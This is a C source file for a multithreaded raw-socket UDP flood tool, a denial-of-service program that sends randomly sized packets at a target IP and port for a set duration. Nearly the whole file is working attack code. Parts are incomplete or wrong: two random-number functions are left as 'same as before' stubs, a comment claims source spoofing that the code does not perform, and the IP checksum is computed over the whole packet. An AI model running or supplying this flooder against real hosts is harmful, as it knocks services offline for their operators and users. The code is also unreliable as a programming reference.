#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <math.h> // Required for sqrt(), M_PI

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodPort;
static unsigned int packetsPerSecond;
static unsigned int sleepTime = 0; //Start at 0, increase if needed.
static int limiter;
static int minPacketSize = 64;
static int maxPacketSize = 512;

//Function Prototypes:
void init_rand(unsigned long int x);
unsigned long int rand_cmwc(void);
uint32_t util_external_addr(void);
unsigned short csum(unsigned short *ptr, int nbytes);
void *flood(void *par1);
double gaussianRandom(double mean, double stddev);

void init_rand(unsigned long int x) { /* ... (same as before) ... */ }
unsigned long int rand_cmwc(void) { /* ... (same as before) ... */ }

uint32_t util_external_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (htonl((8 << 24) | (8 << 16) | (8 << 8) | (8 << 0)));
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

// Function to generate a random number with a Gaussian distribution
double gaussianRandom(double mean, double stddev) {
    double u1 = rand() / (double)RAND_MAX;
    double u2 = rand() / (double)RAND_MAX;
    double z0 = sqrt(-2.0 * log(u1)) * cos(2.0 * M_PI * u2);
    return z0 * stddev + mean;
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");
        pthread_exit(NULL); // Exit thread if socket creation fails
    }

    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        close(s);
        pthread_exit(NULL); // Exit thread if setsockopt fails
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodPort);
    sin.sin_addr.s_addr = inet_addr(td);

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *ipHeader = (struct iphdr *)datagram;
    struct udphdr *udpHeader = (struct udphdr *)(datagram + sizeof(struct iphdr)); //Correct Pointer Arithmetic
    char *data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

    ipHeader->ihl = 5;
    ipHeader->version = 4;
    ipHeader->tos = 0;
    ipHeader->frag_off = 0;
    ipHeader->ttl = 64;
    ipHeader->protocol = IPPROTO_UDP;
    ipHeader->saddr = util_external_addr(); //Spoofed Source Address
    ipHeader->daddr = sin.sin_addr.s_addr;

    udpHeader->dest = htons(floodPort);
    udpHeader->check = 0;

    init_rand(time(NULL));

    while (1)
    {
        //Generate Random Packet Length using Gaussian Distribution
        double packet_len_d = gaussianRandom((minPacketSize + maxPacketSize) / 2.0, (maxPacketSize - minPacketSize) / 6.0);  // Mean = midpoint, stddev = (range)/6
        int data_len = (int) round(packet_len_d);

        //Ensure that the length is within the valid range
        if (data_len < minPacketSize) data_len = minPacketSize;
        if (data_len > maxPacketSize) data_len = maxPacketSize;

        ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        udpHeader->len = htons(sizeof(struct udphdr) + data_len);
        ipHeader->id = htons(rand_cmwc() & 0xFFFF);

        //Fill Payload with Random Data
        for (int i = 0; i < data_len; i++)
        {
            data[i] = rand() % 256;
        }

        //Calculate Checksums (Important!)
        udpHeader->check = 0; // MUST be zero before calculating checksum.

        ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);

        sendto(s, datagram, ntohs(ipHeader->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));

        packetsPerSecond++;

        if (limiter > 0 && packetsPerSecond > limiter)  //Use simple limiter, can improve later
        {
            usleep(sleepTime);
        }
    }
    close(s); //Won't reach here, but good practice
    pthread_exit(NULL);
}

int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stdout, "UDP Flood\nUsage: %s <target IP> <port> <threads> <pps limiter, 0 for no limit> <time(seconds)> [min_packet_size] [max_packet_size]\n", argv[0]);
        return 1; // Indicate an error
    }

    fprintf(stdout, "Setting up...\n");

    int numThreads = atoi(argv[3]);
    floodPort = atoi(argv[2]);
    limiter = atoi(argv[4]);
    int attackDuration = atoi(argv[5]); //Duration in Seconds

    if (argc > 6) minPacketSize = atoi(argv[6]);
    if (argc > 7) maxPacketSize = atoi(argv[7]);

    pthread_t thread[numThreads];

    printf("Flooding %s on port %d with %d threads for %d seconds. Limiter: %d pps. Packet Size: %d-%d\n",
           argv[1], floodPort, numThreads, attackDuration, limiter, minPacketSize, maxPacketSize);

    time_t startTime = time(NULL); //Record Start Time

    for (int i = 0; i < numThreads; i++)
    {
        if (pthread_create(&thread[i], NULL, &flood, (void *)argv[1]) != 0)
        {
            perror("Failed to create thread");
            return 1; // Indicate an error
        }
    }

    //Monitor the Attack and Adjust Limiter if needed
    while (time(NULL) - startTime < attackDuration)
    {
        printf("Packets Sent: %u\n", packetsPerSecond);
        packetsPerSecond = 0; //Reset Counter.
        sleep(1); //Check once per second
    }

    printf("Attack Finished.  Waiting for threads to exit...\n");

    //Cancel threads (less graceful, but ensures they terminate)
    for (int i = 0; i < numThreads; i++)
    {
        pthread_cancel(thread[i]);
    }

    //Wait for threads to finish (optional, but cleaner)
    for (int i = 0; i < numThreads; i++)
    {
        pthread_join(thread[i], NULL);
    }

    printf("Done.\n");

    return 0;
}
